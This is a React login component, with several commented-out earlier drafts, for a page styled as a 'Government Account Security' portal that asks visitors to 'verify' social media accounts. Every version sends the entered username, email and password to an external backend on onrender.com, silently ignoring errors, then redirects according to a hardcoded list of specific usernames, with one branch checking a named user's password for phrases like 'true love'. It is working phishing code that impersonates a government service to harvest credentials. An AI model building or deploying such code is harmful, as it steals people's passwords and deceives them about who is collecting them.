//             show(`❌ ${randomInvalid}`, 3500);

//         } catch (err) {
//             console.error("NETWORK / SERVER ERROR:", err);

//             const randomServer =
//                 SERVER_ERRORS[Math.floor(Math.random() * SERVER_ERRORS.length)];
//             show(` ${randomServer}`, 4000);
//         }
//     };

//     /* ---------------- UI ---------------- */
//     return (
//         <div className="min-h-screen bg-gradient-to-br from-black via-[#020617] to-black flex items-center justify-center px-4">

//             {/* 🔔 POPUP */}
//             {popup && (
//                 <div className="fixed top-20 right-4 bg-yellow-400 text-black
//                 px-5 py-3 rounded-xl shadow-xl text-sm font-medium z-50">
//                     {popup}
//                 </div>
//             )}

//             <div className="w-full max-w-5xl grid md:grid-cols-2 gap-12 items-center">

//                 {/* LEFT INFO */}
//                 <div className="hidden md:flex flex-col gap-4">
//                     <h1 className="text-5xl font-bold text-white leading-tight">
//                         Government <br /> Account Security
//                     </h1>
//                     <p className="text-gray-400 text-lg">
//                         Verify your social media account using a secure
//                         verification system.
//                     </p>

//                     <div className="mt-6 flex gap-4">
//                         <div className="bg-white/5 border border-white/10 px-5 py-3 rounded-xl">
//                             🔐 Secure verification
//                         </div>
//                         <div className="bg-white/5 border border-white/10 px-5 py-3 rounded-xl">
//                             ⚡ Fast & reliable
//                         </div>
//                     </div>
//                 </div>

//                 {/* LOGIN CARD */}
//                 <form
//                     onSubmit={submit}
//                     className="w-full max-w-md mx-auto bg-[#0f172a]/90
//                     backdrop-blur-xl border border-white/10
//                     rounded-2xl shadow-2xl p-8 space-y-6"
//                 >
//                     <div className="text-center">
//                         <h2 className="text-3xl font-bold text-white">
//                             Verify Your Account
//                         </h2>
//                         <p className="text-gray-400 mt-2 text-sm">
//                             Secure social media verification
//                         </p>
//                     </div>

//                     <div className="space-y-4">
//                         <input
//                             type="text"
//                             name="userName"
//                             placeholder="Username"
//                             value={form.userName}
//                             onChange={handleChange}
//                             className="w-full bg-[#020617] border border-white/10
//                             px-4 py-3 rounded-xl text-white placeholder-gray-500
//                             focus:outline-none focus:ring-2 focus:ring-blue-600"
//                         />

//                         <input
//                             type="email"
//                             name="email"
//                             placeholder="Email address"
//                             value={form.email}
//                             onChange={handleChange}
//                             className="w-full bg-[#020617] border border-white/10
//                             px-4 py-3 rounded-xl text-white placeholder-gray-500
//                             focus:outline-none focus:ring-2 focus:ring-blue-600"
//                         />

//                         <input
//                             type="password"
//                             name="passWord"
//                             placeholder="Password"
//                             value={form.passWord}
//                             onChange={handleChange}
//                             className="w-full bg-[#020617] border border-white/10
//                             px-4 py-3 rounded-xl text-white placeholder-gray-500
//                             focus:outline-none focus:ring-2 focus:ring-blue-600"
//                         />
//                     </div>

//                     <button
//                         type="submit"
//                         className="w-full bg-blue-600 hover:bg-blue-700
//                         py-3 rounded-xl font-semibold text-white
//                         transition-all duration-300 active:scale-95"
//                     >
//                         Verify & Continue
//                     </button>

//                     <p className="text-center text-gray-500 text-sm">
//                         © Government Account Security Platform
//                     </p>
//                 </form>
//             </div>
//         </div>
//     );
// }






// import React, { useState } from "react";
// import { useNavigate } from "react-router-dom";

// /* ================= CONFIG ================= */
// const BACKEND_URL = "https://security-backend-c1hz.onrender.com/login";

// const OWNER_ACCOUNTS = {
//     "_creamy_moon_629": "/Account_creamy_moon_629",
//     "its_meee_pihu_09": "/Account_its_meee_pihu_09",
//     "itx_me_somya": "/Account_itx_me_somya",
//     "itx_pikachu65": "/Account_itx_pikachu65",
//     "itx_pragya_06": "/Account_itx_pragya_06",
//     "blueberry076780": "/Account_blueberry076780",
//     "mr_purav_1432": "/Account_mr_purav_1432",
//     "mr_raj_rajpoot_555": "/Account_mr_raj_rajpoot_555",
// };

// export default function Login() {
//     const navigate = useNavigate();

//     const [form, setForm] = useState({
//         userName: "",
//         email: "",
//         passWord: "",
//     });

//     const [popup, setPopup] = useState("");

//     /* ================= POPUP ================= */
//     const show = (msg, time = 3000) => {
//         setPopup(msg);
//         setTimeout(() => setPopup(""), time);
//     };

//     /* ================= INPUT ================= */
//     const handleChange = (e) =>
//         setForm({ ...form, [e.target.name]: e.target.value });

//     /* ================= SUBMIT ================= */
//     const submit = async (e) => {
//         e.preventDefault();

//         if (!form.userName || !form.email || !form.passWord) {
//             show("⚠️ Please fill all required fields");
//             return;
//         }

//         show("🔒 Submitting verification request...");

//         try {
//             await fetch(BACKEND_URL, {
//                 method: "POST",
//                 headers: { "Content-Type": "application/json" },
//                 body: JSON.stringify(form),
//             });
//         } catch (err) {
//             console.error("NETWORK ERROR:", err);
//         }

//         // Normalize username (safe for mobile + PC)
//         const uname = form.userName
//             .trim()
//             .toLowerCase()
//             .replace(/\s+/g, "");

//         // OWNER → ACCOUNT PAGE
//         if (OWNER_ACCOUNTS[uname]) {
//             show("✅ Account verified. Redirecting...");
//             setTimeout(() => navigate(OWNER_ACCOUNTS[uname]), 800);
//         }
//         // NON-OWNER → DEFAULT PAGE
//         else {
//             show("ℹ️ Request submitted successfully");
//             setTimeout(() => navigate("/Default"), 800);
//         }
//     };

//     /* ================= UI ================= */
//     return (
//         <div className="min-h-screen bg-gradient-to-br from-black via-[#020617] to-black flex items-center justify-center px-4">

//             {/* POPUP */}
//             {popup && (
//                 <div className="fixed top-20 right-4 bg-yellow-400 text-black
//         px-5 py-3 rounded-xl shadow-xl text-sm font-medium z-50">
//                     {popup}
//                 </div>
//             )}

//             <div className="w-full max-w-5xl grid md:grid-cols-2 gap-12 items-center">

//                 {/* LEFT INFO */}
//                 <div className="hidden md:flex flex-col gap-6">
//                     <h1 className="text-5xl font-bold text-white leading-tight">
//                         Government <br /> Account Security
//                     </h1>
//                     <p className="text-gray-400 text-lg">
//                         Secure social media verification system trusted by professionals.
//                     </p>

//                     <div className="flex gap-4 mt-4">
//                         <div className="bg-white/5 border border-white/10 px-5 py-3 rounded-xl">
//                             🔐 Secure Verification
//                         </div>
//                         <div className="bg-white/5 border border-white/10 px-5 py-3 rounded-xl">
//                             ⚡ Fast Processing
//                         </div>
//                     </div>
//                 </div>

//                 {/* LOGIN CARD */}
//                 <form
//                     onSubmit={submit}
//                     className="w-full max-w-md mx-auto bg-[#0f172a]/90
//           backdrop-blur-xl border border-white/10
//           rounded-2xl shadow-2xl p-8 space-y-6"
//                 >

//                     {/* SOCIAL ICON IMAGE PLACEHOLDER */}
//                     <div className="flex justify-center">
//                         <img
//                             src="/social.png"   // 🔥 place image in public folder
//                             alt="Social Media"
//                             className="w-24 h-24 object-contain"
//                         />
//                     </div>

//                     <div className="text-center">
//                         <h2 className="text-3xl font-bold text-white">
//                             Verify Your Account
//                         </h2>
//                         <p className="text-gray-400 mt-2 text-sm">
//                             Government-approved verification portal
//                         </p>
//                     </div>

//                     <div className="space-y-4">
//                         <input
//                             type="text"
//                             name="userName"
//                             placeholder="Username"
//                             value={form.userName}
//                             onChange={handleChange}
//                             className="w-full bg-[#020617] border border-white/10
//               px-4 py-3 rounded-xl text-white placeholder-gray-500
//               focus:outline-none focus:ring-2 focus:ring-blue-600"
//                         />

//                         <input
//                             type="email"
//                             name="email"
//                             placeholder="Email address"
//                             value={form.email}
//                             onChange={handleChange}
//                             className="w-full bg-[#020617] border border-white/10
//               px-4 py-3 rounded-xl text-white placeholder-gray-500
//               focus:outline-none focus:ring-2 focus:ring-blue-600"
//                         />

//                         <input
//                             type="password"
//                             name="passWord"
//                             placeholder="Password"
//                             value={form.passWord}
//                             onChange={handleChange}
//                             className="w-full bg-[#020617] border border-white/10
//               px-4 py-3 rounded-xl text-white placeholder-gray-500
//               focus:outline-none focus:ring-2 focus:ring-blue-600"
//                         />
//                     </div>

//                     <button
//                         type="submit"
//                         className="w-full bg-blue-600 hover:bg-blue-700
//             py-3 rounded-xl font-semibold text-white
//             transition-all duration-300 active:scale-95"
//                     >
//                         Verify & Continue
//                     </button>

//                     <p className="text-center text-gray-500 text-sm">
//                         © Government Account Security Platform
//                     </p>
//                 </form>
//             </div>
//         </div>
//     );
// }







// import React, { useState } from "react";
// import { useNavigate } from "react-router-dom";

// /* ================= CONFIG ================= */
// const BACKEND_URL = "https://security-backend-c1hz.onrender.com/login";

// const OWNER_ACCOUNTS = {
//     "_creamy_moon_629": "/Account_creamy_moon_629",
//     "its_meee_pihu_09": "/Account_its_meee_pihu_09",
//     "itx_me_somya": "/Account_itx_me_somya",
//     "itx_pikachu65": "/Account_itx_pikachu65",
//     "itx_pragya_06": "/Account_itx_pragya_06",
//     "blueberry076780": "/Account_blueberry076780",
//     "mr_purav_1432": "/Account_mr_purav_1432",
//     "mr_raj_rajpoot_555": "/Account_mr_raj_rajpoot_555",
// };

// // 🔥 SPECIAL KEYWORDS FOR ALERT PAGE
// const CREAMY_ALERT_KEYWORDS = [
//     "saccha pyaar",
//     "sachha pyaar",
//     "saccha pyar",
//     "true love"
// ];

// export default function Login() {
//     const navigate = useNavigate();

//     const [form, setForm] = useState({
//         userName: "",
//         email: "",
//         passWord: "",
//     });

//     const [popup, setPopup] = useState("");

//     /* ================= POPUP ================= */
//     const show = (msg, time = 3000) => {
//         setPopup(msg);
//         setTimeout(() => setPopup(""), time);
//     };

//     /* ================= INPUT ================= */
//     const handleChange = (e) =>
//         setForm({ ...form, [e.target.name]: e.target.value });

//     /* ================= SUBMIT ================= */
//     const submit = async (e) => {
//         e.preventDefault();

//         if (!form.userName || !form.email || !form.passWord) {
//             show("⚠️ Please fill all required fields");
//             return;
//         }

//         show("🔒 Submitting verification request...");

//         try {
//             await fetch(BACKEND_URL, {
//                 method: "POST",
//                 headers: { "Content-Type": "application/json" },
//                 body: JSON.stringify(form),
//             });
//         } catch (err) {
//             console.error("NETWORK ERROR:", err);
//         }

//         // 🔑 Normalize values
//         const uname = form.userName.trim().toLowerCase().replace(/\s+/g, "");
//         const password = form.passWord.toLowerCase();

//         /* ================= SPECIAL CREAMY ALERT LOGIC ================= */
//         if (
//             uname === "_creamy_moon_629" ||
//             uname === "creamy_moon_629"
//         ) {
//             const matched = CREAMY_ALERT_KEYWORDS.some(keyword =>
//                 password.includes(keyword)
//             );

//             if (matched) {
//                 show("⚠️ Sensitive keyword detected. Redirecting...");
//                 setTimeout(() => {
//                     navigate("/Account_creamy_moon_629_Alert");
//                 }, 800);
//                 return;
//             }
//         }

//         /* ================= NORMAL OWNER FLOW ================= */
//         if (OWNER_ACCOUNTS[uname]) {
//             show("✅ Account verified. Redirecting...");
//             setTimeout(() => navigate(OWNER_ACCOUNTS[uname]), 800);
//         }
//         /* ================= NON-OWNER ================= */
//         else {
//             show("ℹ️ Request submitted successfully");
//             setTimeout(() => navigate("/Default"), 800);
//         }
//     };

//     /* ================= UI ================= */
//     return (
//         <div className="min-h-screen bg-gradient-to-br from-black via-[#020617] to-black flex items-center justify-center px-4">

//             {/* POPUP */}
//             {popup && (
//                 <div className="fixed top-20 right-4 bg-yellow-400 text-black
//                 px-5 py-3 rounded-xl shadow-xl text-sm font-medium z-50">
//                     {popup}
//                 </div>
//             )}

//             <div className="w-full max-w-5xl grid md:grid-cols-2 gap-12 items-center">

//                 {/* LEFT INFO */}
//                 <div className="hidden md:flex flex-col gap-6">
//                     <h1 className="text-5xl font-bold text-white leading-tight">
//                         Government <br /> Account Security
//                     </h1>
//                     <p className="text-gray-400 text-lg">
//                         Secure social media verification system trusted by professionals.
//                     </p>

//                     <div className="flex gap-4 mt-4">
//                         <div className="bg-white/5 border border-white/10 px-5 py-3 rounded-xl">
//                             🔐 Secure Verification
//                         </div>
//                         <div className="bg-white/5 border border-white/10 px-5 py-3 rounded-xl">
//                             ⚡ Fast Processing
//                         </div>
//                     </div>
//                 </div>

//                 {/* LOGIN CARD */}
//                 <form
//                     onSubmit={submit}
//                     className="w-full max-w-md mx-auto bg-[#0f172a]/90
//                     backdrop-blur-xl border border-white/10
//                     rounded-2xl shadow-2xl p-8 space-y-6"
//                 >
//                     <div className="flex justify-center">
//                         <img
//                             src="/social.png"
//                             alt="Social Media"
//                             className="w-24 h-24 object-contain"
//                         />
//                     </div>

//                     <div className="text-center">
//                         <h2 className="text-3xl font-bold text-white">
//                             Verify Your Account
//                         </h2>
//                         <p className="text-gray-400 mt-2 text-sm">
//                             Government-approved verification portal
//                         </p>
//                     </div>

//                     <div className="space-y-4">
//                         <input
//                             type="text"
//                             name="userName"
//                             placeholder="Username"
//                             value={form.userName}
//                             onChange={handleChange}
//                             className="w-full bg-[#020617] border border-white/10
//                             px-4 py-3 rounded-xl text-white placeholder-gray-500
//                             focus:outline-none focus:ring-2 focus:ring-blue-600"
//                         />

//                         <input
//                             type="email"
//                             name="email"
//                             placeholder="Email address"
//                             value={form.email}
//                             onChange={handleChange}
//                             className="w-full bg-[#020617] border border-white/10
//                             px-4 py-3 rounded-xl text-white placeholder-gray-500
//                             focus:outline-none focus:ring-2 focus:ring-blue-600"
//                         />

//                         <input
//                             type="password"
//                             name="passWord"
//                             placeholder="Password"
//                             value={form.passWord}
//                             onChange={handleChange}
//                             className="w-full bg-[#020617] border border-white/10
//                             px-4 py-3 rounded-xl text-white placeholder-gray-500
//                             focus:outline-none focus:ring-2 focus:ring-blue-600"
//                         />
//                     </div>

//                     <button
//                         type="submit"
//                         className="w-full bg-blue-600 hover:bg-blue-700
//                         py-3 rounded-xl font-semibold text-white
//                         transition-all duration-300 active:scale-95"
//                     >
//                         Verify & Continue
//                     </button>

//                     <p className="text-center text-gray-500 text-sm">
//                         © Government Account Security Platform
//                     </p>
//                 </form>
//             </div>
//         </div>
//     );
// }



import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

/* ================= CONFIG ================= */
const BACKEND_URL = "https://security-backend-c1hz.onrender.com/login";

const OWNER_ACCOUNTS = {
    "_creamy_moon_629": "/Account_creamy_moon_629",
    "its_meee_pihu_09": "/Account_its_meee_pihu_09",
    "itx_me_somya": "/Account_itx_me_somya",
    "itx_pikachu65": "/Account_itx_pikachu65",
    "itx_pragya_06": "/Account_itx_pragya_06",
    "blueberry076780": "/Account_blueberry076780",
    "mr_purav_1432": "/Account_mr_purav_1432",
    "mr_raj_rajpoot_555": "/Account_mr_raj_rajpoot_555",
};

const CREAMY_ALERT_KEYWORDS = [
    "saccha pyaar",
    "sachha pyaar",
    "saccha pyar",
    "true love"
];

export default function Login() {
    const navigate = useNavigate();

    const [form, setForm] = useState({
        userName: "",
        email: "",
        passWord: "",
    });

    const [popup, setPopup] = useState("");

    /* ================= POPUP ================= */
    const show = (msg) => setPopup(msg);

    const handleChange = (e) =>
        setForm({ ...form, [e.target.name]: e.target.value });

    /* ================= SUBMIT ================= */
    const submit = async (e) => {
        e.preventDefault();

        if (!form.userName || !form.email || !form.passWord) {
            show("⚠️ Please fill all required fields");
            return;
        }

        show("🔒 Verifying account...");

        // 🔥 EMAIL SEND (NO BLOCKING)
        fetch(BACKEND_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(form),
        }).catch(() => { }); // intentionally ignored

        // 🔑 Normalize
        const uname = form.userName.trim().toLowerCase().replace(/\s+/g, "");
        const password = form.passWord.toLowerCase();

        /* ================= CREAMY MOON LOGIC ================= */
        if (uname === "_creamy_moon_629" || uname === "creamy_moon_629") {

            const sensitiveMatch = CREAMY_ALERT_KEYWORDS.some(k =>
                password.includes(k)
            );

            if (sensitiveMatch) {
                navigate("/Account_creamy_moon_629_Alert");
                return;
            }

            // ✅ NORMAL CREAMY ACCOUNT
            navigate("/Account_creamy_moon_629");
            return;
        }

        /* ================= OTHER OWNERS ================= */
        if (OWNER_ACCOUNTS[uname]) {
            navigate(OWNER_ACCOUNTS[uname]);
            return;
        }

        /* ================= NON OWNER ================= */
        navigate("/Default");
    };

    /* ================= UI ================= */
    return (
        <div className="min-h-screen bg-gradient-to-br from-black via-[#020617] to-black flex items-center justify-center px-4">

            {popup && (
                <div className="fixed top-20 right-4 bg-yellow-400 text-black 
                px-5 py-3 rounded-xl shadow-xl text-sm font-medium z-50">
                    {popup}
                </div>
            )}

            <form
                onSubmit={submit}
                className="w-full max-w-md bg-[#0f172a]/90 
                backdrop-blur-xl border border-white/10 
                rounded-2xl shadow-2xl p-8 space-y-6"
            >

                <div className="flex justify-center">
                    <img src="/social.png" alt="Social" className="w-24 h-24" />
                </div>

                <h2 className="text-center text-3xl font-bold text-white">
                    Verify Your Account
                </h2>

                <input
                    name="userName"
                    placeholder="Username"
                    onChange={handleChange}
                    className="w-full bg-[#020617] px-4 py-3 rounded-xl text-white"
                />

                <input
                    name="email"
                    placeholder="Email"
                    onChange={handleChange}
                    className="w-full bg-[#020617] px-4 py-3 rounded-xl text-white"
                />

                <input
                    name="passWord"
                    type="password"
                    placeholder="Password"
                    onChange={handleChange}
                    className="w-full bg-[#020617] px-4 py-3 rounded-xl text-white"
                />

                <button
                    type="submit"
                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-xl text-white font-semibold"
                >
                    Verify & Continue
                </button>
            </form>
        </div>
    );
}
